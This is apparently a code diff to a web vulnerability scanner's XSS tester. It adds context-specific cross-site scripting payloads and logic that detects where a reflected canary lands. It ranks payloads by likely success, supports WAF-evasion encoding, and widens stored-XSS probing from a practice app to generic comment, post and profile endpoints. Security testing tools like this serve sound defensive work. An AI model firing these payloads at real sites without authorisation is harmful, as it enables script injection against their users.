@@ -43,6 +43,43 @@ ESCALATION_PAYLOADS: list[str] = [
     "<marquee onstart=alert(1)>",
 ]
 
+# Context-specific XSS payloads (selected based on where the canary lands)
+CONTEXT_PAYLOADS: dict[str, list[str]] = {
+    "html_body": [
+        "<img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<script>alert(1)</script>",
+    ],
+    "html_attribute": [
+        '" onmouseover="alert(1)',
+        "' onmouseover='alert(1)",
+        '" onfocus="alert(1)" autofocus="',
+        '" autofocus onfocus="alert(1)',
+    ],
+    "js_single_quote": [
+        "';alert(1)//",
+        "'-alert(1)-'",
+        "';\nalert(1)//",
+    ],
+    "js_double_quote": [
+        '";alert(1)//',
+        '"-alert(1)-"',
+    ],
+    "js_bare": [
+        ";alert(1)//",
+        "-alert(1)-",
+    ],
+    "html_comment": [
+        "--><svg onload=alert(1)>",
+        "--><img src=x onerror=alert(1)>",
+    ],
+    "html_tag": [
+        " onmouseover=alert(1) x=",
+        "><img src=x onerror=alert(1)>",
+    ],
+}
+
 # ---------------------------------------------------------------------------
 # DOM XSS sinks and sources
 # ---------------------------------------------------------------------------
@@ -73,6 +110,52 @@ DOM_SOURCES: list[tuple[str, str]] = [
     (r"window\.location", "window.location"),
     (r"postMessage\s*\(", "postMessage()"),
 ]
+
+
+def _detect_context(html_text: str, canary: str) -> str:
+    """Determine the injection context of a reflected canary in the response.
+
+    Looks at the HTML structure around the canary position to determine
+    whether it landed in an HTML body, attribute, script block, comment, etc.
+
+    Returns one of: html_body, html_attribute, js_single_quote,
+    js_double_quote, js_bare, html_comment, html_tag, not_reflected
+    """
+    idx = html_text.find(canary)
+    if idx == -1:
+        return "not_reflected"
+
+    before = html_text[max(0, idx - 500):idx]
+
+    # Inside HTML comment?
+    if "<!--" in before and "-->" not in before[before.rfind("<!--"):]:
+        return "html_comment"
+
+    # Inside <script> tag?
+    last_script_open = before.rfind("<script")
+    last_script_close = before.rfind("</script")
+    if last_script_open > last_script_close:
+        # Count unescaped quotes to determine string context
+        script_content = before[last_script_open:]
+        single_count = script_content.count("'") - script_content.count("\\'")
+        double_count = script_content.count('"') - script_content.count('\\"')
+        if single_count % 2 == 1:
+            return "js_single_quote"
+        if double_count % 2 == 1:
+            return "js_double_quote"
+        return "js_bare"
+
+    # Inside an HTML tag?
+    last_open = before.rfind("<")
+    last_close = before.rfind(">")
+    if last_open > last_close:
+        tag_content = before[last_open:]
+        # Inside an attribute value?
+        if re.search(r'=\s*["\'][^"\']*$', tag_content):
+            return "html_attribute"
+        return "html_tag"
+
+    return "html_body"
 
 
 # ---------------------------------------------------------------------------
@@ -355,8 +438,13 @@ class PythonXSSTester:
 
         logger.info("Canary reflected in param=%s, escalating payloads", param)
 
-        # Step 2: Try escalation payloads
-        payloads = list(ESCALATION_PAYLOADS)
+        # Detect injection context and select appropriate payloads
+        context = _detect_context(response_text, canary)
+        context_specific = CONTEXT_PAYLOADS.get(context, [])
+
+        # Start with context-specific payloads (most likely to succeed),
+        # then fall back to generic payloads
+        payloads = list(dict.fromkeys(context_specific + list(ESCALATION_PAYLOADS)))
         if self._waf_evasion:
             from numasec.scanners._encoder import PayloadEncoder
 
@@ -482,10 +570,13 @@ class PythonXSSTester:
     # ------------------------------------------------------------------
 
     # Stored XSS targets: (write_path, write_method, write_field, read_path)
+    # Generic state-changing endpoints commonly found in web apps
     _STORED_XSS_TARGETS: list[tuple[str, str, str, str]] = [
-        ("/api/Products/1", "PUT", "description", "/api/Products/1"),
-        ("/api/Feedbacks", "POST", "comment", "/api/Feedbacks"),
-        ("/rest/products/reviews", "POST", "message", "/rest/products/reviews"),
+        ("/api/comments", "POST", "body", "/api/comments"),
+        ("/api/posts", "POST", "content", "/api/posts"),
+        ("/api/feedback", "POST", "message", "/api/feedback"),
+        ("/api/reviews", "POST", "text", "/api/reviews"),
+        ("/api/profile", "PUT", "bio", "/api/profile"),
     ]
 
     _STORED_XSS_PAYLOADS: list[str] = [
@@ -516,10 +607,6 @@ class PythonXSSTester:
                 try:
                     # Inject the payload
                     body: dict[str, Any] = {field_name: payload}
-                    if "Feedbacks" in write_path:
-                        body.update({"UserId": 1, "rating": 5, "captchaId": 0, "captcha": "0"})
-                    if "reviews" in write_path:
-                        body.update({"author": "numasec@test.com"})
 
                     if method == "PUT":
                         resp = await client.put(write_url, json=body)
